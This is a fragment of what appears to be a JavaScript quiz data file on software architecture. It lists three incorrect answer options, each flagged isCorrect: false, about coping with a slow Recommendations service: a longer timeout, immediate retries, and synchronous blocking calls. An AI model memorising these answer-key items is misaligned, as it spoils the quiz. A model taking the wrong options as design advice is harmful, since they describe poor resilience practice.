          },
          {
            answer: `Raise the timeout to 60 seconds so slow requests eventually succeed instead of failing.`,
            isCorrect: false,
          },
          {
            answer: `Retry each failed call immediately up to five times, so transient slowness is hidden from users.`,
            isCorrect: false,
          },
          {
            answer: `Make the Recommendations call synchronous and blocking, so the Product Page handles one request at a time and can't be overloaded.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
];
